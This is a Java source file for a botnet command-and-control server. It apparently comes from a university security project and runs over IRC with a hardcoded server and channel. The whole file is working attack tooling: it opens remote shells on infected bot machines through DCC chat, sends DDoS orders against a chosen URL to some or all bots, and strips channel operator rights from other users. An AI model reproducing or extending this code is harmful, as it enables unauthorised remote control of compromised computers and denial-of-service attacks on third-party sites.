import java.io.*;
import java.net.*;
import java.util.*;

import org.jibble.pircbot.*;

/**
 * This is the BotnetServer class, it serve as the command and control interface for the bot master.
 * There are several commands available to the user including
 * <dl>
 * 		<dt>Help</dt>
 * 			<dd> Prints out the available commands <br/>
 * 				Usage: help
 * 			</dd>
 * 		<dt>Names</dt>
 * 			<dd> Prints out the nicks of all bots running on the IRC server <br/>
 * 				Usage: names
 * 			</dd>
 * 		<dt>Remote shell</dt>
 * 			<dd> One must give the command "exit" to leave the shell again, if you must type "exit" but don't wish to leave simply append a space <br/>
 * 				Usage: shell botNick [timeout]
 * 			</dd>
 * 		<dt>Distributed Denial of Service</dt>
 * 			<dd> One can specify by nick and number of bots to have participate or simply say "all" for the first bot nick to have all bots participate  <br/>
 * 				Usage: ddos url interval duration bot [more bots]
 * 			</dd>
 * 		<dt>Spam</dt>
 * 			<dd>
 * 			</dd>
 * 		<dt>Lease</dt>
 * 			<dd>
 * 			</dd>
 * </dl>
 * 
 * @author Roy McElmurry, Robert Johnson
 */
public class BotnetServer extends PircBot {
	private static final String[] COMMANDS = {"help", "names", "list", "shell", "ddos", "spam", "lease", "killbot", "destroybotnet"};
	
	private static final String SENTINEL = "$: ";
	private static final String TERMINATION = "exit";
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "RandR";
	private static final boolean DEBUG = true;
	private static final int PORT = 6667;
	private static final int TIMEOUT = 120000;
	private Scanner input;
	private boolean inChat;
	
	public static void main(String[] args) {
		BotnetServer bn = new BotnetServer();
	}
	
	/**
	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
	 */
	public BotnetServer() {
		input = new Scanner(System.in);
		try {
			setVerbose(DEBUG);
			setName(NAME);
			setMessageDelay(0);
			
			connect(SERVER, PORT);
			
			setMode(CHANNEL, "s");
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			changeNick(NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	protected void onConnect() {
		joinChannel(CHANNEL);
	}
	
	protected void onUserList(String channel, User[] bots) {
		for (int i = 0; i < bots.length; i++) {
			System.out.println("\t" + bots[i].toString());
		}
		init();
	}
	
	protected void onChannelInfo(String channel, int userCount, String topic) {
		System.out.println("\t" + channel + " (" + userCount + ")");
	}
	
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		System.out.println("<" + sender + ">: " + message);
	}
	
	/**
	 * Reads input from the user and handles the command.
	 */
	public void init() {
		System.out.print("Command: ");
		String message = input.nextLine();
		while(!message.toLowerCase().equalsIgnoreCase("q")) {
			performCommand(message);
			System.out.print("Command: ");
			message = input.nextLine();
		}
	}
	
	/** 
	 * <p>If s is a recognized command, the corresponding action is taken, 
	 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
	 * and finally if it is not a command or a private message to the channel then it is sent 
	 * as a raw message the IRC server.</p>
	 * 
	 * @param s A command/message to be interpreted
	 */
	public void performCommand(String s) {
		//Respond to a help command with a shit ton of printlns.
		if (s.toLowerCase().equalsIgnoreCase("help")) {
			printHelp();
		//Respond to a list command by listing all channels (DOESN'T WORK)
		} else if (s.toLowerCase().equalsIgnoreCase("list")) {
			listChannels();
		//Respond to a names command by getting the user on CHANNEL and printing their nicks
		} else if (s.toLowerCase().equals("names")) {
			User[] bots = getUsers(CHANNEL);
			for (int i = 0; i < bots.length; i++) {
				System.out.println("\t" + bots[i].toString());
			}
		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
			acquireOpStatus();
		//Respond to the shell command by sending commands to the specified bot and reading responses until the chat has ended
		} else if (s.toLowerCase().startsWith("shell")) {
			String[] parts = s.split(" ");
			if (parts.length >= 3) {
				engageInChat(parts[1], Integer.parseInt(parts[2]));
			} else if (parts.length >= 2) {
				engageInChat(parts[1], TIMEOUT);
			} else {
				System.out.println("\tUsage: shell botNick [timeout]");
			}
		//Respond to a ddos command by gathering the arguments and private messaging each specified bot
		} else if (s.toLowerCase().startsWith("ddos")) {
			String[] parts = s.split(" ");
			if (parts.length < 5) {
				System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
			} else {
				String[] botNames;
				if (parts[4].equalsIgnoreCase("all")) {
					User[] bots = getUsers(CHANNEL);
					botNames = new String[bots.length];
					for (int i = 0; i < bots.length; i++) {
						botNames[i] = bots[i].getNick();
					}
				} else {
					botNames = Arrays.copyOfRange(parts, 4, parts.length);
				}
				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
				for (int i = 0; i < botNames.length; i++) {
					this.sendMessage(botNames[i], command);
				}
			}
		//Respond to a message beginning with a colon by messaging the CHANNEL
		} else if (s.startsWith(":")) {
			sendMessage(CHANNEL, s.substring(1));
		//Respond to all other messages by sending the message raw to the IRC server
		} else if (!s.isEmpty()) {
			sendRawLine(s);
		}
	}
	
	/**
	 * Gives the CC bot operator status and then removes it from all other bots.
	 */
	private void acquireOpStatus() {
		op(CHANNEL, NAME);
		User[] bots = getUsers(CHANNEL);
		for (int i = 0; i < bots.length; i++) {
			System.out.println(bots[i].getNick());
			if (!bots[i].getNick().equals(NAME)) {
				deOp(CHANNEL, bots[i].toString());
			}
		}
		op(CHANNEL, NAME);
	}
	
	/**
	 * Prints out a help message that describes available functionality and commands.
	 */
	private void printHelp() {
		System.out.println("\tBotnet:");
		System.out.println("\t\tList");
		System.out.println("\t\t\tlists the available channels on this server");
		System.out.println("\t\tNames");
		System.out.println("\t\t\tlists the bots currently on this channel");
		System.out.println("\t\tShell usernick [timeout]");
		System.out.println("\t\t\topens a remote shell with the machine hosting the user");
		System.out.println("\t\t\twith the given nick (type \"exit\" to exit shell)");
		System.out.println("\t\t\tif you need to type \"exit\" without leaving the shell add a space at the end");
		System.out.println("\t\tDDOS url interval duration bot [more bots]");
		System.out.println("\t\t\trequests the given url every 'interval' seconds for");
		System.out.println("\t\t\t'duration' seconds from each of the given bots (pass 'all' to use all bots)");
	}
	
	/**
	 * Establishes a DCC chat with the specified bot for the purpose of creating a remote shell.
	 * Feeds commands to the bot and prints out responses.
	 */
	private void engageInChat(String botNick, int timeout) {
		DccChat chat = dccSendChatRequest(botNick, timeout);
		if (chat == null) {
			System.out.println("The chat request was rejected.");
		} else {
			Scanner input = new Scanner(System.in);
			Scanner shellout = new Scanner(chat.getBufferedReader());
			
			try {
				System.out.print(shellout.nextLine());
				
				String command = input.nextLine();
				while (!command.equalsIgnoreCase(TERMINATION)) {
					chat.sendLine(command);
					String response = shellout.nextLine();
					while (!response.endsWith(SENTINEL)) {
						System.out.println("\t" + response);
						response = shellout.nextLine();
					}
					System.out.print(response);
					command = input.nextLine();
				}
				chat.sendLine(command);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
